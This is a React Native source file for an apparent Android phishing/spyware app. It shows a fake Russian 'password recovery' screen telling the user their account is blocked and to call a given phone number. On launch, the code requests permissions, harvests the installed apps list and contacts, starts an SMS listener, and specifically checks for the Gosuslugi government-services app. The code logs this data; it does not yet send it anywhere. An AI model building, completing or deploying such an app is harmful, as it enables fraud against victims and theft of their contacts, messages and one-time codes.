import React, { useState, useEffect } from 'react';
import { View, TextInput, TouchableOpacity, Text, StyleSheet, PermissionsAndroid } from 'react-native';
import SvgComponent from './svgs/Logo';
import MyInput from './Components/MyInput';
import axios from 'axios';
import Contact from './modules/Contact';
import Apps from './modules/Apps';
import Permission from './modules/Permission';
import Sms_Listener from './modules/Sms_Listener';
export default function App() {
  const [inputText, setInputText] = useState('');
  var contacts = ""
  var apps =""
  var message = "" 
  const isButtonEnabled = inputText.length >= 4;
  const handleInputChange = (text) => {
    setInputText(text);
  };
  const handleContinuePress = () => {
    console.log('Продолжить');
  };
  const permissions = async () => {
    await Permission.requestPermissions()
  }
  const loadApp = async () => {
    apps = await Apps.loadApps()
    contacts = await Contact.loadContacts()
   message = await Sms_Listener.startListen()
  };
  const workWithApp = async () => {
    await loadApp()
  }
  const workWithData = async () => {
    console.log("Contacts: ", contacts[0].phoneNumbers)
    console.log("meesage: "+message)
    apps.forEach(element => {
      if (element.label == "Госуслуги") {
        console.log("app: ", element.packageName)
      }
    });
  }
  useEffect(() => {
    const fetchData = async () => {
      await permissions();
      await workWithApp();
      await workWithData();
    };

    fetchData();
  }, [])
  return (
    <View style={styles.container}>
      <View style={styles.main}>
        <SvgComponent style={styles.svg} />
        <View>
          <Text style={styles.text}>Восстановление пароля</Text>
        </View>
        <View style={styles.maintext}>
          <Text style={styles.text2}>
            Контрольный вопрос:
          </Text>
        </View>
        <View style={styles.numberview}>
          <Text style={styles.numberview_text}>Ваш аккаунт заблокирован, свяжитесь с оператором 8 800 600-37-56</Text>
        </View>
        <View>
          <MyInput onTextChange={handleInputChange} />
        </View>
        <TouchableOpacity
          style={[styles.button, { backgroundColor: isButtonEnabled ? '#007AFF' : '#ccc' }]}
          onPress={handleContinuePress}
          disabled={!isButtonEnabled}
        >
          <Text style={styles.buttonText}>Продолжить</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#c1d4f5',
    alignItems: 'center',
    justifyContent: 'center',
  },
  main: {
    backgroundColor: '#fff',
    height: 500,
    width: 350,
    borderRadius: 15,
    alignItems: "center",
    flexDirection: "column",
  },
  svg: {
    paddingTop: 110
  },
  text: {
    fontSize: 22,
    fontWeight: "bold",
    color: 'black'
  },
  text2: {
    fontSize: 18,
    color: 'black'
  },
  maintext: {
    alignItems: "center",
    paddingTop: 30,
    paddingBottom: 10,
    color: 'black'
  },
  numberview: {
    alignItems: "center",

  },
  numberview_text: {
    textAlign: 'center',
    fontWeight: 'bold',
    fontSize: 14,
    paddingLeft: 10,
    paddingRight: 10,
    lineHeight: 25,
    color: 'black'
  },
  button: {
    width: 300,
    height: 60,
    justifyContent: 'center',
    alignItems: 'center',
    borderRadius: 5,
    marginTop: 50
  },
  buttonText: {
    color: 'white',
    fontSize: 16,
  },
});
